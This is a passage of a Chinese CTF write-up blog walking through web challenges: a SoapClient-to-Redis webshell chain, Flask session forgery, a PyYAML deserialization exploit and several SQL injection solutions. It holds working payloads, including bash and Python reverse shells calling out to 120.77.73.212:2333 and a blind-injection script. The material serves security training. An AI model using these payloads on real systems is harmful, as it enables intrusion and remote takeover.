invoke__">serialize</span>(<span class="variable">$hint</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$hint</span> = <span class="string">&quot;My favorite database is Redis and My favorite day is 20220311&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>知道密码的redis</p><p>审计代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">newnewnew</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;love = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">wllm</span>(<span class="variable">$this</span>-&gt;arsenetang,<span class="variable">$this</span>-&gt;l61q4cheng);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;love-&gt;<span class="title function_ invoke__">getflag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">newnewnew</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">flag</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>new了一个类，并且调用了这个类的getflag()方法，再加上是redis，很明显是SoapClient类。</p><p>payload</p><blockquote><p>低版本的Redis会将http请求的请求头内容作为redis命令解析</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span>=<span class="string">&#x27;http://127.0.0.1:6379/&#x27;</span>;</span><br><span class="line"><span class="variable">$poc</span>=<span class="string">&quot;AUTH 20220311&quot;</span>;</span><br><span class="line"><span class="variable">$poc1</span>=<span class="string">&quot;CONFIG SET dir /var/www/html&quot;</span>;</span><br><span class="line"><span class="variable">$poc2</span>=<span class="string">&quot;SET x &#x27;&lt;?@eval(\$_POST[1]);?&gt;&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$poc3</span>=<span class="string">&quot;CONFIG SET dbfilename shell.php&quot;</span>;</span><br><span class="line"><span class="variable">$poc4</span>=<span class="string">&quot;SAVE&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;uri&#x27;</span> =&gt;</span><br><span class="line"><span class="string">&#x27;^^&#x27;</span>.<span class="variable">$poc</span>.<span class="string">&#x27;^^&#x27;</span>.<span class="variable">$poc1</span>.<span class="string">&#x27;^^&#x27;</span>.<span class="variable">$poc2</span>.<span class="string">&#x27;^^&#x27;</span>.<span class="variable">$poc3</span>.<span class="string">&#x27;^^&#x27;</span>.<span class="variable">$poc4</span>.<span class="string">&#x27;^^&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$aaa</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">swpu</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wllm</span> = <span class="string">&#x27;SoapClient&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arsenetang</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$l61q4cheng</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$love</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$swpu</span> = <span class="keyword">new</span> <span class="title function_ invoke__">swpu</span>();</span><br><span class="line"><span class="variable">$swpu</span>-&gt;l61q4cheng = <span class="variable">$c</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$swpu</span>));</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221027164155928-1687419303719.png" alt="image-20221027164155928"></p><p>反弹shell</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>=<span class="title function_ invoke__">system</span>(%<span class="number">22</span>bash%<span class="number">20</span>-c%<span class="number">20</span><span class="string">&#x27;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F120.77.73.212%2F2333%200%3E%261&#x27;</span>%<span class="number">22</span>)%<span class="number">3</span>B</span><br></pre></td></tr></table></figure><p>SUID提权</p><p><img src="/../images/image-20221027165218664-1687419303719.png" alt="image-20221027165218664"></p><h2 id="BlogSystem–复现"><a href="#BlogSystem–复现" class="headerlink" title="BlogSystem–复现"></a>BlogSystem–复现</h2><p>信息收集，在文章中出现了key，尝试构造session</p><p><img src="/../images/image-20221104151224136-1687419303719.png" alt="image-20221104151224136"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PS E:\scripts\web\flask&gt; python flask-session.py encode -s <span class="string">&#x27;7his_1s_my_fav0rite_ke7&#x27;</span> -t <span class="string">&quot;&#123;&#x27;_permanent&#x27;: True, &#x27;username&#x27;: &#x27;admin&#x27;&#125;&quot;</span></span><br><span class="line">eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6ImFkbWluIn0.Y2S-xQ.V9-DZaiArnzERULY9NHBYf3WL6s</span><br></pre></td></tr></table></figure><p>伪造后身份为admin,多了一个下载功能。</p><p><img src="/../images/image-20221105124636999-1687419303719.png" alt="image-20221105124636999"></p><p>可以猜测后端是使用了<code>os.path.join()</code>来连接path参数。</p><p>这里尝试目录穿越，师傅是尝试并猜测出后端的语句是<code>.replace(&#39;..&#39;, &#39;&#39;).replace(&#39;//&#39;, &#39;&#39;)</code></p><p>其实也可以直接利用<code>os.path.join(path,path1)</code>的漏洞，只要拼接的路径path1是绝对路径，就会忽略掉path。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.join(<span class="string">&#x27;/tmp&#x27;</span>, <span class="string">&#x27;/home/khaz&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;/home/khaz&#x27;</span></span><br></pre></td></tr></table></figure><p>读取app.py源码</p><p><img src="/../images/image-20221105130144960-1687419303719.png" alt="image-20221105130144960"></p><p>导入了<strong>config</strong> <strong>model</strong> <strong>view</strong>，典型的MVT结构</p><p><img src="/../images/image-20221105141455843-1687419303719.png" alt="image-20221105141455843"></p><p>尝试访问<code>/app/view.py</code>无果，访问<code>/app/view/__init__.py</code>,得到</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> .index <span class="keyword">import</span> index</span><br><span class="line"><span class="keyword">from</span> .blog <span class="keyword">import</span> blog</span><br></pre></td></tr></table></figure><p>读取源码 index.py blog.py</p><p>关键部分</p><ul><li>waf</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">r&#x27;apply|process|eval|os|tuple|popen|frozenset|bytes|type|staticmethod|\(|\)&#x27;</span>, <span class="built_in">str</span>(data), re.M | re.I):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><ul><li>文件上传功能点</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/imgUpload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span><span class="comment"># 还记得app.py注册了蓝图，所以路由为/blog/imgUpload</span></span><br><span class="line"><span class="meta">@login_limit</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">imgUpload</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        file = request.files.get(<span class="string">&#x27;editormd-image-file&#x27;</span>)</span><br><span class="line">        fileName = file.filename.replace(<span class="string">&#x27;..&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        filePath = os.path.join(<span class="string">&quot;static/upload/&quot;</span>, fileName)</span><br><span class="line">        file.save(filePath)</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;上传成功!&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;url&#x27;</span>: <span class="string">&quot;/&quot;</span> + filePath</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;上传失败&#x27;</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><ul><li>读取文件功能点</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/saying&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@admin_limit</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Saying</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;path&#x27;</span>):</span><br><span class="line">        file = request.args.get(<span class="string">&#x27;path&#x27;</span>).replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;hack&#x27;</span>).replace(<span class="string">&#x27;..\\&#x27;</span>, <span class="string">&#x27;hack&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f = f.read()</span><br><span class="line">                <span class="keyword">if</span> waf(f):</span><br><span class="line">                    <span class="built_in">print</span>(yaml.load(f, Loader=Loader))</span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;鲁迅说：当你看到这句话时，还没有拿到flag，那就赶紧重开环境吧&#x27;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;鲁迅说：你说得不对&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;鲁迅说：&#x27;</span>+<span class="built_in">str</span>(e))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;view/jojo.yaml&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            sayings = yaml.load(f, Loader=Loader)</span><br><span class="line">            saying = random.choice(sayings)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=saying)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>漏洞点，会用yaml.load函数来加载文件（可控），配合文件上传可以造成yaml反序列化漏洞</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(yaml.load(f, Loader=Loader))</span><br></pre></td></tr></table></figure><p><a href="https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/#%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2">yaml反序列化漏洞</a></p><p>根据上面文章，可以知道我们需要上传一个poc.yaml</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">!!python/module:static.upload</span><br></pre></td></tr></table></figure><p>一个<code>__init__.py</code>文件</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os,pty,socket;s=socket.socket();s.connect((<span class="string">&quot;120.77.73.212&quot;</span>,<span class="number">2333</span>));[os.dup2(s.fileno(),f)<span class="keyword">for</span> f <span class="keyword">in</span>(<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>)];pty.spawn(<span class="string">&quot;sh&quot;</span>)</span><br></pre></td></tr></table></figure><p>上传文件脚本</p><p>需要注意的是<code>imgUpload()</code>中<code>file = request.files.get(&#39;editormd-image-file&#39;)</code>以及带上session</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://1aef01d5-e675-4e45-9357-2524a3e5c570.node4.buuoj.cn:81/blog/imgUpload&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123; name : (文件名,文件内容，文件MIME)  &#125;  将文件信息填入元组（）中，只有文件内容是必选的。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传本地文件</span></span><br><span class="line"><span class="comment">#files = &#123;&quot;editormd-image-file&quot;: (&quot;__init__.py&quot;, open(&#x27;E:\scripts\poc.py&#x27;, &#x27;rb&#x27;))&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接上传文件内容字符串（注意要用二进制）</span></span><br><span class="line">files = &#123;<span class="string">&quot;editormd-image-file&quot;</span>: (<span class="string">&quot;poc.yaml&quot;</span>, <span class="string">b&#x27;!!python/module:static.upload&#x27;</span>)&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment"># bp代理</span></span><br><span class="line">pro = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8011&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;direction&#x27;</span>:<span class="string">&#x27;upload&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">&#x27;session&#x27;</span> : <span class="string">&#x27;eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6ImFkbWluIn0.Y2S-xQ.V9-DZaiArnzERULY9NHBYf3WL6s&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url=url,files=files,proxies=pro,cookies=cookie,data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221105135517382-1687419303719.png" alt="image-20221105135517382"></p><p>然后服务器监听端口，访问<code>/blog/saying?path=static/upload/poc.yaml</code>即可</p><p><img src="/../images/image-20221105135258653-1687419303719.png" alt="image-20221105135258653"></p><h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h2 id="强网杯2019-随便注"><a href="#强网杯2019-随便注" class="headerlink" title="[强网杯2019]随便注"></a>[强网杯2019]随便注</h2><p>告诉我们注入点了</p><p>参数类型，由语法错误可知是单引号闭合</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure><p>经过测试是堆叠注入，所以其后端sql查询使用的是mysqli_multi_query() </p><p>并且有过滤</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|update|delete|drop|insert|where|\./i&quot;</span>,<span class="variable">$inject</span>);</span><br></pre></td></tr></table></figure><p>通过show tables知道表名，所以可以使用handle来绕过select，得到表中的信息。</p><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>只有一个登陆界面，无注册界面，目录扫描无结果。</p><p>测试为单引号闭合。</p><p>在登录后的search.php源代码中找到注释，经过解码得到<code>select * from user where username = &#39;$name&#39;</code></p><p>猜测登陆上去即可获得flag</p><p>通过联合查询构造临时用户</p><p>username&#x3D;<code>1&#39; union select 1,&#39;admin&#39;,&#39;c4ca4238a0b923820dcc509a6f75849b&#39;#</code></p><p>passwd&#x3D;<code>1</code></p><blockquote><p>需要注意的是前面不能为admin’，不然它就会去比较原来admin所对应的密码</p></blockquote><p>成功登录获得flag。</p><h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>join注册后，点击username，发现url参数<code>view.php?no=1</code>，可能存在sql注入</p><p>进行测试，<code>1^0</code>页面报错，所以存在sql注入</p><p>判断参数类型，发现为整型</p><p>进行fuzz，发现<code>union select</code>被过滤</p><p><img src="/../images/image-20220728125208126-1687489655110.png" alt="image-20220728125208126"></p><p>尝试构造<code>union/**/select</code>绕过</p><p><img src="/../images/image-20220728125647157-1687489655112.png" alt="image-20220728125647157"></p><p>发现可以绕过，且字段数不为3</p><p><img src="/../images/image-20220728125537515-1687489655113.png" alt="image-20220728125537515"></p><p>发现反序列化函数，字段数为4，可利用的字段在2位置</p><blockquote><p>到这里sql注入就有两个思路，一是联合注入(页面有回显点)，二是报错注入（页面有报错日志，这里过滤了0x7e）。</p></blockquote><p>接下来按照正常思路做即可。</p><p>最后查字段值时会发现users表的第四列data中存放的是经过序列化后的用户的信息</p><p><img src="/../images/image-20220728172644784-1687489655113.png" alt="image-20220728172644784"></p><p>关于反序列化，就一定要有源码。</p><p>进行目录扫描得到user.php.bak，以及flag.php的存在</p><p>主要关注</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="comment">#用curl对博客地址发起请求，并获取内容</span></span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>构造序列化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">#利用file协议请求本地文件</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">UserInfo</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?no=-<span class="number">1</span> union<span class="comment">/**/</span>select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p>这里把其放在第四列，是因为博客信息是存储在users表的第四列data中的</p><p>能够成功的原因是union&#x2F;**&#x2F;select不加表名的特性，会在前面的select表中构造临时数据。</p></blockquote><p>最后在源代码blog content部分可以得到flag.php的内容。</p><p><img src="/../images/image-20220728173710364-1687489655113.png" alt="image-20220728173710364"></p><h2 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h2><p>原理</p><blockquote><p>在mysql中+只能当作算术运算符，与php中的+类似 ，可以进行数字字符串+数字的计算</p></blockquote><p><img src="/../images/image-20220717191455431-1687489655114.png" alt="image-20220717191455431"></p><p>前置条件</p><blockquote><p>查询的结果只有一列</p></blockquote><p><img src="/../images/image-20220718093833432-1687489655113.png" alt="image-20220718093833432"></p><p>进去是一个登录界面，一般先找注册界面，登录后再找注入点。</p><p>直接访问url&#x2F;register.php</p><p>需要填三个信息：邮箱，用户名，密码</p><p>登录后，观察到页面只有一个可疑之处,显示了用户名</p><p><img src="/../images/image-20220717182811431-1687489655115.png" alt="image-20220717182811431"></p><p>所以，注入点应该是在用户名处，为回显注入。</p><blockquote><p>这里可以猜测显示用户名的后端语句为<code>select username from table where email=$email</code></p></blockquote><hr><p>回到注册界面继续测试，验证想法。</p><p>注册用户名1”注册成功，用户名为1’时注册失败</p><p><img src="/../images/image-20220717184809571-1687489655115.png" alt="image-20220717184809571"></p><blockquote><p>猜测注册的sql语句为<code>insert into table  value(&#39;$email&#39;,&#39;$username&#39;,&#39;$passwd&#39;) </code>单引号闭合</p></blockquote><p>还有一个点就是，邮箱是唯一的，如果用相同的邮箱注册多个账号只有第一个账号是可以登陆上去的。</p><p>进行fuzz</p><p><img src="/../images/image-20220717185630970-1687489655114.png" alt="image-20220717185630970"></p><p>发现红框内的被过滤</p><p>因为语句为<code>insert into table  value(&#39;$email&#39;,&#39;$username&#39;,&#39;$passwd&#39;) </code></p><p>只能使用运算盲注（其他的构造不了）</p><p>payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register_url = <span class="string">&#x27;http://645cbdc0-53d4-4a12-8d7c-653400adc1dd.node4.buuoj.cn:81/register.php&#x27;</span></span><br><span class="line">login_url = <span class="string">&#x27;http://645cbdc0-53d4-4a12-8d7c-653400adc1dd.node4.buuoj.cn:81/login.php&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    register_data = &#123;</span><br><span class="line">        <span class="comment">#邮箱是唯一的，如果用相同的邮箱注册多个账号只有第一个账号是可以登陆上去的。所以每次注册邮箱都要不同</span></span><br><span class="line">        <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;111@123.com&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i),</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;0&#x27; + ascii(substr((select * from flag) from &#123;&#125; for 1)) + &#x27;0&quot;</span>.<span class="built_in">format</span>(i),</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=register_url, data=register_data)</span><br><span class="line"></span><br><span class="line">    login_data = &#123;</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;111@123.com&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i),</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res_ = requests.post(url=login_url, data=login_data)</span><br><span class="line">    code = re.search(<span class="string">r&#x27;&lt;span class=&quot;user-name&quot;&gt;\s*(\d*)\s*&lt;/span&gt;&#x27;</span>, res_.text)</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">int</span>(code.group(<span class="number">1</span>)))</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><h2 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> ip <span class="keyword">from</span> ip_table</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if(isset($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] <span class="operator">=</span> $_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ip <span class="operator">=</span> $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$last_ip <span class="operator">=</span> &quot;&quot;;</span><br><span class="line">$<span class="keyword">result</span> <span class="operator">=</span> query(&quot;select current_ip, last_ip from ip_log where uuid = &#x27;&quot;.addslashes($uuid).&quot;&#x27;&quot;);</span><br><span class="line">if(<span class="built_in">count</span>($<span class="keyword">result</span>) <span class="operator">&gt;</span> <span class="number">0</span>) </span><br><span class="line">&#123;</span><br><span class="line">    if($ip <span class="operator">!=</span><span class="operator">=</span> $<span class="keyword">result</span>[<span class="number">0</span>][<span class="string">&#x27;current_ip&#x27;</span>]) &#123;</span><br><span class="line">        $last_ip <span class="operator">=</span> $<span class="keyword">result</span>[<span class="number">0</span>][<span class="string">&#x27;current_ip&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        query(&quot;delete from ip_log where uuid=&#x27;&quot;.addslashes($uuid).&quot;&#x27;&quot;);</span><br><span class="line">    &#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">        $last_ip <span class="operator">=</span> $<span class="keyword">result</span>[<span class="number">0</span>][<span class="string">&#x27;last_ip&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">query(&quot;insert into ip_log values (&#x27;&quot;.addslashes($uuid).&quot;&#x27;, &#x27;&quot;.addslashes($ip).&quot;&#x27;, &#x27;$last_ip&#x27;);&quot;);</span><br></pre></td></tr></table></figure><p>第一次表中无数据，if(count($result) &gt; 0)不成立，$ip&#x3D;x-forwarded-for1  $last_ip&#x3D;空,插入ip_log表中</p><p>第二次 表中有数据，if(count($result) &gt; 0) 成立，$ip&#x3D;x-forwarded-for2    $last_ip&#x3D;x-forwarded-for1 ,删除第一次插入的数据，插入第二次数据。</p><p>第三次表中有数据, 